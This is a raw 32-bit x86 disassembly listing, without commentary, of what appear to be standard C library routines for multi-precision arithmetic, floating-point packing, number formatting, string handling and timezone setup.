mov dword [esp], eax
call fcn.0808d570
cmp esi, 0x1f
jg 0x808d458
mov ecx, dword [arg_8h]
mov eax, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808d080
test esi, esi
jle 0x808d28d
mov edx, dword [arg_8h]
mov eax, dword [arg_10h]
lea ebx, [edx + esi*4]
lea ecx, [edx + eax*4]
mov edx, esi
mov esi, esi
mov eax, dword [ecx]
add ecx, 4
mov dword [ebx], eax
add ebx, 4
dec edx
jne 0x808d280
mov edx, dword [arg_10h]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
add edx, esi
lea eax, [ecx + edx*4]
mov dword [var_10h], edx
mov dword [var_8h], eax
mov eax, dword [arg_10h]
shl eax, 2
mov dword [var_14h], eax
mov eax, ecx
add eax, dword [var_14h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
mov edx, dword [arg_10h]
mov ecx, dword [arg_14h]
mov ebx, eax
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov edx, dword [arg_8h]
lea eax, [edx + esi*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808d570
sub ebx, eax
cmp esi, 0x1f
jg 0x808d436
mov ecx, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], ecx
call fcn.0808d080
mov edx, dword [arg_10h]
mov ecx, dword [arg_14h]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov edx, dword [arg_8h]
lea eax, [edx + esi*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
je 0x808d368
mov eax, dword [var_10h]
mov edx, dword [arg_8h]
mov dword [var_18h], esi
lea ecx, [edx + eax*4]
mov edx, dword [ecx]
lea edi, [ecx + 4]
lea eax, [edx + ebx]
cmp eax, edx
mov dword [ecx], eax
mov ecx, edi
jae 0x808d410
mov eax, esi
dec eax
mov dword [var_18h], eax
je 0x808d368
lea esi, [esi]
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808d410
dec dword [var_18h]
jne 0x808d350
xor edx, edx
cmp edx, esi
jge 0x808d381
mov esi, esi
mov ecx, dword [arg_14h]
mov eax, dword [ecx + edx*4]
mov ecx, dword [arg_8h]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808d370
mov edx, dword [arg_14h]
lea eax, [esi*4]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_8h]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
test eax, eax
je 0x808d1cd
mov eax, dword [arg_10h]
mov edx, dword [arg_8h]
lea ecx, [edx + eax*4]
mov ebx, eax
mov edx, dword [ecx]
lea esi, [ecx + 4]
lea eax, [edx + 1]
cmp eax, edx
mov dword [ecx], eax
mov ecx, esi
jae 0x808d3e7
dec ebx
je 0x808d1cd
mov esi, esi
mov edx, dword [esi]
add esi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808d3e7
dec ebx
jne 0x808d3d0
jmp 0x808d1cd
cmp ecx, esi
je 0x808d1cd
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808d1cd
lea esi, [esi]
mov eax, dword [esi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808d400
jmp 0x808d1cd
cmp ecx, edi
je 0x808d368
mov ebx, dword [var_18h]
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808d368
mov eax, dword [edi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808d426
jmp 0x808d368
mov eax, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], edi
add eax, dword [var_14h]
mov dword [var_ch], eax
mov eax, dword [arg_14h]
mov dword [esp], eax
call fcn.0808d150
jmp 0x808d2fd
mov ecx, dword [arg_14h]
mov edx, dword [arg_10h]
mov dword [var_8h], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov dword [var_ch], eax
mov eax, dword [arg_8h]
mov dword [var_4h], eax
call fcn.0808d150
jmp 0x808d26c
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
mov dword [var_4h], edi
mov dword [esp], edx
jmp 0x808d248
mov eax, dword [arg_14h]
mov edx, dword [arg_10h]
mov dword [var_8h], esi
mov ecx, dword [arg_8h]
mov dword [var_ch], eax
lea eax, [edi + esi*4]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808d150
jmp 0x808d21b
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_8h], ebx
mov ecx, dword [arg_10h]
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov edx, dword [arg_14h]
mov esi, dword [arg_8h]
cmp ebx, ecx
je 0x808d52a
cmp edx, 0x1f
jg 0x808d500
mov dword [var_ch], edx
mov dword [var_sp_8h], ecx
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.0808cb40
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
lea esi, [esi]
lea eax, [edx*8 + 0x10]
sub esp, eax
lea eax, [arg_23h]
mov dword [var_ch], edx
mov dword [var_sp_8h], ecx
and eax, 0xfffffff0
mov dword [var_sp_4h], ebx
mov dword [esp], esi
mov dword [var_10h], eax
call fcn.0808cc10
jmp 0x808d4f5
cmp edx, 0x1f
jg 0x808d541
mov dword [var_sp_8h], edx
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.0808d080
jmp 0x808d4f5
lea eax, [edx*8 + 0x10]
sub esp, eax
lea eax, [arg_23h]
mov dword [var_sp_8h], edx
mov dword [var_sp_4h], ebx
and eax, 0xfffffff0
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0808d150
jmp 0x808d4f5
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
mov edi, dword [arg_ch]
mov esi, dword [arg_10h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov eax, ecx
shr ecx, 3
neg eax
and eax, 7
je 0x808d5a8
inc ecx
shl eax, 2
sub edi, eax
sub esi, eax
sub edx, eax
shr eax, 2
lea eax, [eax + eax*8 + 0x808d5a5]
jmp eax
lea esi, [esi]
mov eax, dword [esi]
sbb eax, dword [edx]
mov dword [edi], eax
mov eax, dword [esi + 4]
sbb eax, dword [edx + 4]
mov dword [edi + 4], eax
mov eax, dword [esi + 8]
sbb eax, dword [edx + 8]
mov dword [edi + 8], eax
mov eax, dword [esi + 0xc]
sbb eax, dword [edx + 0xc]
mov dword [edi + 0xc], eax
mov eax, dword [esi + 0x10]
sbb eax, dword [edx + 0x10]
mov dword [edi + 0x10], eax
mov eax, dword [esi + 0x14]
sbb eax, dword [edx + 0x14]
mov dword [edi + 0x14], eax
mov eax, dword [esi + 0x18]
sbb eax, dword [edx + 0x18]
mov dword [edi + 0x18], eax
mov eax, dword [esi + 0x1c]
sbb eax, dword [edx + 0x1c]
mov dword [edi + 0x1c], eax
lea edi, [edi + 0x20]
lea esi, [esi + 0x20]
lea edx, [edx + 0x20]
dec ecx
jne 0x808d5a8
sbb eax, eax
neg eax
pop esi
pop edi
ret
push edi
push esi
push ebp
push ebx
mov edi, dword [arg_14h]
mov esi, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov ebx, dword [arg_20h]
lea edi, [edi + ecx*4]
lea esi, [esi + ecx*4]
neg ecx
xor ebp, ebp
mov esi, esi
mov eax, dword [esi + ecx*4]
mul ebx
add eax, ebp
adc edx, 0
sub dword [edi + ecx*4], eax
adc edx, 0
mov ebp, edx
inc ecx
jne 0x808d620
mov eax, ebp
pop ebx
pop ebp
pop esi
pop edi
ret
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
mov eax, dword [arg_14h]
mov ecx, dword [arg_18h]
push ebx
mov esi, dword [arg_10h]
mov edi, dword [arg_8h]
mov ebx, dword [arg_1ch]
mov dword [edi], ecx
mov edx, ebx
shr edx, 0x1f
mov dword [eax], edx
mov edx, ebx
shr edx, 0x14
and edx, 0x7ff
lea eax, [edx - 0x3ff]
mov dword [esi], eax
mov esi, ebx
and esi, 0xfffff
test edx, edx
mov dword [edi + 4], esi
jne 0x808d71b
test ecx, ecx
jne 0x808d69f
test esi, esi
jne 0x808d69f
mov eax, dword [arg_10h]
mov dword [eax], 0
pop ebx
pop esi
pop edi
mov eax, 2
leave
ret
mov esi, dword [edi + 4]
test esi, esi
je 0x808d6d9
bsr ebx, esi
mov edx, dword [edi]
xor ebx, 0x1f
sub ebx, 0xb
mov ecx, ebx
shl esi, cl
mov eax, edx
mov ecx, 0x20
sub ecx, ebx
shr eax, cl
mov ecx, ebx
or esi, eax
shl edx, cl
mov eax, 0xfffffc02
mov dword [edi + 4], esi
sub eax, ebx
mov dword [edi], edx
mov esi, dword [arg_10h]
mov dword [esi], eax
jmp 0x808d695
bsr ebx, dword [edi]
xor ebx, 0x1f
cmp ebx, 0xa
jle 0x808d702
mov eax, dword [edi]
lea ecx, [ebx - 0xb]
mov dword [edi], 0
shl eax, cl
mov dword [edi + 4], eax
mov edx, dword [arg_10h]
mov eax, 0xfffffbed
sub eax, ebx
mov dword [edx], eax
jmp 0x808d695
mov edx, dword [edi]
mov ecx, 0xb
sub ecx, ebx
mov eax, edx
shr eax, cl
lea ecx, [ebx + 0x15]
shl edx, cl
mov dword [edi + 4], eax
mov dword [edi], edx
jmp 0x808d6f4
or esi, 0x100000
mov dword [edi + 4], esi
jmp 0x808d695
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov ecx, dword [arg_20h]
mov edx, dword [arg_1ch]
mov eax, dword [arg_18h]
mov esi, dword [arg_8h]
mov dword [var_14h], ecx
mov dword [var_18h], edx
mov ecx, dword [arg_10h]
mov dword [var_1ch], eax
mov edx, dword [arg_14h]
movzx eax, byte [var_13h]
shr al, 7
movzx eax, al
mov dword [edx], eax
movzx edx, word [var_14h]
and edx, 0x7fff
lea eax, [edx - 0x3fff]
test edx, edx
mov dword [ecx], eax
mov eax, dword [var_1ch]
mov dword [esi], eax
mov ecx, dword [var_18h]
mov dword [esi + 4], ecx
jne 0x808d7a2
test eax, eax
jne 0x808d7af
test ecx, ecx
jne 0x808d7af
mov eax, dword [arg_10h]
mov dword [eax], 0
add esp, 0x10
mov eax, 2
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [esi + 4]
and ebx, 0x7fffffff
test ebx, ebx
mov dword [esi + 4], ebx
je 0x808d7f3
bsr eax, ebx
mov edi, eax
xor edi, 0x1f
je 0x808d7e5
mov edx, dword [esi]
mov ecx, edi
shl ebx, cl
mov ecx, 0x20
sub ecx, edi
mov eax, edx
shr eax, cl
mov ecx, edi
or ebx, eax
shl edx, cl
mov dword [esi + 4], ebx
mov dword [esi], edx
mov eax, 0xffffc002
mov edx, dword [arg_10h]
sub eax, edi
mov dword [edx], eax
jmp 0x808d7a2
mov eax, dword [esi]
test eax, eax
je 0x808d813
bsr edi, eax
mov dword [esi], 0
xor edi, 0x1f
mov ecx, edi
shl eax, cl
mov dword [esi + 4], eax
mov eax, 0xffffbfe2
jmp 0x808d7ea
mov ecx, dword [arg_10h]
mov dword [esi + 4], 0x80000000
mov dword [ecx], 0xffffc002
jmp 0x808d7a2
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
and edx, 0x7fffffff
mov ebp, esp
sub esp, 4
mov eax, dword [arg_10h]
shl eax, 0x1f
or edx, eax
mov eax, dword [arg_ch]
and edx, 0x807fffff
add eax, 0x7f
and eax, 0xff
shl eax, 0x17
or edx, eax
mov eax, dword [arg_8h]
and edx, 0xff800000
mov eax, dword [eax]
and eax, 0x7fffff
or edx, eax
mov dword [var_4h], edx
fld dword [ebp - 4]
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov ecx, dword [arg_10h]
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
mov edx, ecx
shl edx, 0x1f
add ebx, 0x3ff
mov eax, dword [esi]
mov ecx, edx
and ebx, 0x7ff
and ecx, 0x800fffff
shl ebx, 0x14
mov edx, ecx
or edx, ebx
mov ebx, dword [esi + 4]
mov esi, dword [var_4h]
mov ecx, edx
mov dword [var_10h], eax
and ecx, 0xfff00000
and ebx, 0xfffff
mov edx, ecx
or edx, ebx
mov ebx, dword [var_8h]
mov dword [var_ch], edx
fld qword [ebp - 0x10]
leave
ret
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
movzx eax, byte [var_7h]
mov edx, dword [arg_10h]
mov ecx, dword [arg_8h]
shl edx, 7
and eax, 0x7f
or eax, edx
mov edx, dword [arg_ch]
mov byte [var_7h], al
mov eax, dword [var_8h]
add edx, 0x3fff
and dx, 0x7fff
and ax, 0x8000
or eax, edx
mov word [var_8h], ax
mov eax, dword [ecx]
mov dword [var_10h], eax
mov eax, dword [ecx + 4]
mov dword [var_ch], eax
fld xword [ebp - 0x10]
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov ebx, dword [arg_10h]
mov ecx, dword [arg_18h]
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [var_28h], str.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
test ecx, ecx
mov dword [var_24h], eax
mov dword [var_20h], edx
mov eax, str.0123456789abcdefghijklmnopqrstuvwxyz
cmovne eax, dword [var_28h]
mov edx, dword [arg_14h]
cmp edx, 8
mov dword [var_28h], eax
lea eax, [edx + edx*2]
lea eax, [eax*4 + str.nplurals]
mov dword [var_38h], eax
je 0x808da99
cmp edx, 0x10
je 0x808da56
mov edi, dword [var_20h]
mov esi, edi
xor edi, edi
test esi, esi
mov dword [var_34h], esi
mov dword [var_30h], edi
je 0x808da44
mov edi, dword [var_38h]
mov eax, dword [var_34h]
cmp dword [edi + 8], eax
ja 0x808da29
xor edx, edx
mov dword [var_2ch], 3
div dword [edi + 8]
mov ecx, eax
mov eax, dword [var_24h]
div dword [edi + 8]
mov dword [var_14h], edx
mov edx, ecx
div dword [edi + 8]
mov dword [var_1ch], eax
mov dword [var_18h], edx
dec dword [var_2ch]
xor esi, esi
mov edi, dword [var_2ch]
mov eax, dword [ebp + edi*4 - 0x1c]
test eax, eax
je 0x808d9f1
xor edx, edx
mov edi, dword [var_28h]
sub ebx, 4
div dword [arg_14h]
inc esi
mov ecx, eax
mov eax, dword [edi + edx*4]
test ecx, ecx
mov dword [ebx], eax
mov eax, ecx
jne 0x808d9d8
mov edx, dword [var_2ch]
test edx, edx
je 0x808da1f
mov edx, dword [var_38h]
movsx eax, byte [edx + 5]
cmp esi, eax
jge 0x808da18
mov ecx, dword [var_38h]
sub ebx, 4
inc esi
mov dword [ebx], 0x30
movsx eax, byte [ecx + 5]
cmp esi, eax
jl 0x808da03
mov eax, dword [var_2ch]
test eax, eax
jne 0x808d9c8
add esp, 0x2c
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [var_38h]
mov eax, dword [var_24h]
mov dword [var_2ch], 2
mov edx, dword [var_34h]
div dword [ecx + 8]
mov dword [var_18h], edx
mov dword [var_1ch], eax
jmp 0x808d9c8
mov esi, dword [var_24h]
mov dword [var_2ch], 1
mov dword [var_1ch], esi
jmp 0x808d9c8
mov edx, dword [var_20h]
test edx, edx
je 0x808da94
mov ecx, dword [var_24h]
mov esi, 8
mov edi, dword [var_28h]
mov eax, ecx
dec esi
and eax, 0xf
sub ebx, 4
shr ecx, 4
test esi, esi
mov eax, dword [edi + eax*4]
mov dword [ebx], eax
jg 0x808da65
mov ecx, dword [var_28h]
mov eax, edx
sub ebx, 4
and eax, 0xf
shr edx, 4
mov eax, dword [ecx + eax*4]
mov dword [ebx], eax
jne 0x808da7d
jmp 0x808da1f
mov edx, dword [var_24h]
jmp 0x808da7d
mov edx, dword [var_20h]
test edx, edx
je 0x808daf7
mov ecx, dword [var_24h]
mov esi, 0xa
mov edi, dword [var_28h]
mov eax, ecx
dec esi
and eax, 7
sub ebx, 4
shr ecx, 3
test esi, esi
mov eax, dword [edi + eax*4]
mov dword [ebx], eax
jg 0x808daa8
mov eax, edx
and eax, 1
shl eax, 2
or ecx, eax
shr edx, 1
jne 0x808daea
mov edx, ecx
mov edi, dword [var_28h]
mov eax, edx
sub ebx, 4
and eax, 7
shr edx, 3
mov eax, dword [edi + eax*4]
mov dword [ebx], eax
jne 0x808dad0
jmp 0x808da1f
mov esi, dword [var_28h]
sub ebx, 4
mov eax, dword [esi + ecx*4]
mov dword [ebx], eax
jmp 0x808dad0
mov edx, dword [var_24h]
jmp 0x808dad0
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [arg_18h]
mov dword [var_14h], 0
mov dword [var_10h], eax
mov eax, dword [arg_14h]
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0808db40
leave
ret
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov ebx, dword [arg_1ch]
mov eax, dword [arg_ch]
mov esi, dword [arg_10h]
test ebx, ebx
mov dword [var_10h], eax
je 0x808db62
mov edx, dword [arg_1ch]
mov dword [edx], 0
mov eax, dword [arg_8h]
mov ecx, dword [eax + 0x5c]
test ecx, ecx
je 0x808dc7e
test esi, esi
je 0x808dbc8
mov edx, dword [arg_8h]
mov ebx, dword [edx + 8]
mov edi, dword [edx + 4]
sub ebx, edi
test ebx, ebx
jle 0x808dc15
mov eax, dword [arg_14h]
cmp ebx, esi
mov dword [esp], edi
cmovae ebx, esi
mov dword [var_8h], ebx
mov dword [var_4h], eax
call fcn.08077220
test eax, eax
mov dword [var_14h], eax
jne 0x808dbd6
mov eax, dword [var_10h]
mov dword [var_8h], ebx
mov dword [var_4h], edi
sub esi, ebx
mov dword [esp], eax
call fcn.08053770
add dword [var_10h], ebx
mov edx, dword [arg_8h]
add dword [edx + 4], ebx
test esi, esi
jne 0x808db74
mov eax, dword [var_10h]
sub eax, dword [arg_ch]
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov ebx, eax
mov esi, dword [var_10h]
mov eax, dword [arg_18h]
sub esi, dword [arg_ch]
sub ebx, edi
test eax, eax
js 0x808dbf4
inc dword [var_14h]
lea eax, [ebx + 1]
cmp dword [arg_18h], 1
cmovge ebx, eax
mov edx, dword [var_10h]
mov dword [var_8h], ebx
mov dword [var_4h], edi
mov dword [esp], edx
call fcn.08053770
mov eax, dword [arg_8h]
mov edx, dword [var_14h]
mov dword [eax + 4], edx
lea eax, [ebx + esi]
jmp 0x808dbce
mov dword [esp], edx
call fcn.0804da90
cmp eax, 0xffffffff
je 0x808dc65
cmp eax, dword [arg_14h]
je 0x808dc33
mov edx, dword [var_10h]
dec esi
mov byte [edx], al
inc edx
mov dword [var_10h], edx
jmp 0x808dbc4
cmp dword [arg_18h], 0
jle 0x808dc48
movzx edx, byte [arg_14h]
mov eax, dword [var_10h]
mov byte [eax], dl
inc eax
mov dword [var_10h], eax
jmp 0x808dbc8
jge 0x808dbc8
mov edx, dword [arg_14h]
mov eax, dword [arg_8h]
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.0804e190
jmp 0x808dbc8
mov edx, dword [arg_1ch]
test edx, edx
je 0x808dbc8
mov eax, dword [arg_1ch]
mov dword [eax], 0xffffffff
jmp 0x808dbc8
mov dword [eax + 0x5c], 0xffffffff
jmp 0x808db70
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov edx, dword [arg_ch]
mov eax, ebx
sub eax, edx
lea ecx, [eax - 1]
movzx eax, byte [edx]
inc edx
test al, al
mov byte [ecx + edx], al
jne 0x808dca1
mov eax, ebx
pop ebx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
push edi
mov ecx, dword [arg_ch]
mov edi, dword [arg_8h]
push esi
push ebx
cmp edi, ecx
je 0x808dd0d
movzx esi, byte [edi]
mov eax, esi
movzx edx, al
mov eax, dword [arg_10h]
mov ebx, dword [eax + 0x38]
movzx eax, byte [ecx]
inc ecx
mov edx, dword [ebx + edx*4]
sub edx, dword [ebx + eax*4]
mov eax, edx
jne 0x808dd0d
mov esi, esi
mov edx, esi
inc edi
test dl, dl
je 0x808dd0d
movzx esi, byte [edi]
mov edx, esi
movzx eax, dl
mov edx, dword [ebx + eax*4]
movzx eax, byte [ecx]
inc ecx
sub edx, dword [ebx + eax*4]
mov eax, edx
je 0x808dcf0
pop ebx
pop esi
pop edi
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_8h], edi
mov ecx, dword [arg_ch]
mov dword [esp], ebx
mov edi, dword [arg_8h]
mov dword [var_4h], esi
cmp edi, ecx
je 0x808dd62
mov eax, dword [arg_10h]
test eax, eax
jne 0x808dd71
xor eax, eax
mov ebx, dword [esp]
mov esi, dword [var_4h]
mov edi, dword [var_8h]
leave
ret
mov eax, dword [arg_14h]
movzx ebx, byte [edi]
mov esi, dword [eax + 0x38]
movzx eax, byte [ecx]
inc ecx
movzx edx, bl
mov edx, dword [esi + edx*4]
sub edx, dword [esi + eax*4]
mov eax, edx
jne 0x808dd64
nop
lea esi, [esi]
inc edi
test bl, bl
je 0x808dd64
dec dword [arg_10h]
je 0x808dd64
movzx ebx, byte [edi]
movzx eax, bl
mov edx, dword [esi + eax*4]
movzx eax, byte [ecx]
inc ecx
sub edx, dword [esi + eax*4]
mov eax, edx
je 0x808dd90
jmp 0x808dd64
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov ecx, dword [arg_ch]
mov esi, dword [arg_8h]
mov ebx, dword [esi]
test ebx, ebx
je 0x808de12
movzx edx, byte [ecx]
test dl, dl
je 0x808de1a
cmp byte [ecx + 1], 0
jne 0x808de22
movzx ecx, byte [ebx]
mov eax, ebx
cmp cl, dl
je 0x808de06
test cl, cl
je 0x808de1a
movsx eax, dl
lea edx, [ebx + 1]
mov dword [var_sp_4h], eax
mov dword [esp], edx
call fcn.08076ce0
test eax, eax
je 0x808de1a
mov byte [eax], 0
inc eax
mov dword [esi], eax
mov eax, ebx
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov dword [esi], 0
jmp 0x808de10
mov dword [var_sp_4h], ecx
mov dword [esp], ebx
call fcn.08090e20
jmp 0x808de06
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08053400
mov ebx, dword [0x80aaae0]
mov edi, eax
test ebx, ebx
mov esi, ebx
je 0x808de8c
mov eax, dword [esi + 4]
cmp edi, eax
ja 0x808de84
sub eax, edi
lea ebx, [eax + esi + 8]
mov eax, dword [arg_8h]
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.08076e50
mov edx, ebx
test eax, eax
je 0x808dec2
mov ebx, esi
mov esi, dword [esi]
test esi, esi
jne 0x808de62
lea eax, [edi + 9]
mov dword [esp], eax
call fcn.08050fe0
xor edx, edx
test eax, eax
mov esi, eax
je 0x808dec2
mov dword [eax + 4], edi
mov dword [eax], 0
lea edi, [esi + 8]
mov eax, dword [arg_8h]
mov dword [esp], edi
mov dword [var_4h], eax
call fcn.0808dc90
test ebx, ebx
je 0x808decc
mov dword [ebx], esi
mov edx, edi
add esp, 8
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov dword [0x80aaae0], esi
jmp 0x808dec0
lea esi, [esi]
lea edi, [edi]
push ebp
mov eax, 0
mov ebp, esp
sub esp, 4
test eax, eax
je 0x808defb
mov dword [esp], 0x80aaa6c
call section.
xor eax, eax
call fcn.0808df20
mov eax, 0
test eax, eax
je 0x808df17
mov dword [esp], 0x80aaa6c
call section.
mov eax, dword [0x80aad44]
leave
ret
mov esi, esi
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov edx, dword [0x80aaa68]
test edx, edx
je 0x808df3b
test eax, eax
je 0x808e150
mov dword [0x80aaa68], 1
mov dword [esp], 0x80a7234
call fcn.080631c0
test eax, eax
mov dword [var_20h], eax
je 0x808e822
mov eax, dword [var_20h]
cmp byte [eax], 0
mov eax, str.Universal
cmovne eax, dword [var_20h]
mov dword [var_20h], eax
mov edi, dword [var_20h]
test edi, edi
je 0x808df85
mov edx, dword [var_20h]
mov eax, dword [var_20h]
inc eax
cmp byte [edx], 0x3a
cmovne eax, edx
mov dword [var_20h], eax
mov ebx, dword [0x80aaae4]
test ebx, ebx
je 0x808dfb0
mov esi, dword [var_20h]
test esi, esi
je 0x808dfb0
mov eax, dword [var_20h]
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x808e150
lea esi, [esi]
test ebx, ebx
mov dword [0x80aaaa0], 0
mov dword [0x80aaac0], 0
jne 0x808e815
mov ebx, dword [var_20h]
xor eax, eax
test ebx, ebx
je 0x808dfe0
mov edx, dword [var_20h]
mov dword [esp], edx
call fcn.08076e80
mov dword [0x80aaae4], eax
mov dword [var_8h], 0
mov dword [var_4h], 0
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.0808ecc0
mov ecx, dword [0x80aad48]
test ecx, ecx
jne 0x808e150
mov edx, dword [var_20h]
test edx, edx
je 0x808e040
mov edx, dword [var_20h]
cmp byte [edx], 0
je 0x808e040
mov eax, str._etc_localtime
test eax, eax
je 0x808e158
mov ecx, 0xf
mov esi, edx
mov edi, eax
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x808e158
lea esi, [esi]
mov ecx, 0x80a7250
xor edx, edx
mov dword [0x80aaac0], 0x80a7250
mov dword [0x80aaaa0], ecx
mov dword [0x80aaac4], 0
mov dword [0x80aaaa4], 0
mov word [0x80aaaac], 0
mov word [0x80aaaaa], 0
mov word [0x80aaaa8], 0
mov word [0x80aaacc], 0
mov word [0x80aaaca], 0
mov word [0x80aaac8], 0
mov dword [0x80aaad0], 0
mov dword [0x80aaab0], 0
mov dword [0x80aaad4], 0
mov dword [0x80aaab4], 0
mov dword [0x80aaad8], 0xffffffff
mov dword [0x80aaab8], 0xffffffff
mov dword [0x80aaadc], 0
mov dword [0x80aaabc], 0
xor eax, eax
mov ebx, dword [0x80aaac0]
mov dword [0x80a9c28], ecx
cmp edx, dword [0x80aaad4]
mov dword [esp], ecx
setne al
neg edx
mov dword [0x80aaa64], edx
mov dword [0x80a9c2c], ebx
mov dword [0x80aaa60], eax
call fcn.08053400
mov dword [esp], ebx
mov esi, eax
call fcn.08053400
mov edx, dword [0x80aad44]
mov ecx, eax
cmp esi, edx
jbe 0x808e141
mov edx, esi
mov dword [0x80aad44], esi
mov eax, dword [0x80aad44]
cmp ecx, edx
cmova eax, ecx
mov dword [0x80aad44], eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
cld
xor eax, eax
mov edi, 0x80aaaa0
mov ecx, 0x10
rep stosd dword es:[edi], eax
mov eax, dword [var_20h]
mov dword [0x80aaac0], 0x80a4f11
mov dword [0x80aaaa0], 0x80a4f11
mov dword [esp], eax
call fcn.08053400
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
mov dword [var_8h], edx
lea eax, [var_27h]
mov edx, dword [var_20h]
and eax, 0xfffffff0
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053770
mov dword [var_4h], str.__0_9___
mov dword [var_8h], eax
mov esi, eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.08049be0
dec eax
je 0x808e1d8
mov edx, dword [0x80aaab4]
mov ecx, dword [0x80aaaa0]
jmp 0x808e0f1
mov dword [esp], esi
call fcn.08053400
cmp eax, 2
mov ebx, eax
jbe 0x808e1c7
mov dword [esp], esi
call fcn.0808de40
add dword [var_20h], ebx
mov dword [0x80aaaa0], eax
mov ecx, eax
mov eax, dword [var_20h]
movzx edx, byte [eax]
test dl, dl
mov ebx, edx
je 0x808e80a
cmp dl, 0x2b
je 0x808e222
cmp dl, 0x2d
je 0x808e222
movsx eax, dl
sub eax, 0x30
cmp eax, 9
ja 0x808e80a
cmp bl, 0x2d
je 0x808e7f0
cmp bl, 0x2b
je 0x808e7f0
mov dword [0x80aaab4], 0xffffffff
lea eax, [var_10h]
lea edx, [var_eh]
mov dword [var_4h], str._hu:_hu:_hu
mov dword [var_sp_ch], eax
mov dword [var_sp_10h], edx
mov eax, dword [var_20h]
lea edx, [var_12h]
mov dword [var_8h], edx
mov dword [esp], eax
call fcn.08049be0
cmp eax, 2
je 0x808e27e
jg 0x808e7e2
dec eax
jne 0x808e1c7
mov word [var_10h], 0
mov word [var_eh], 0
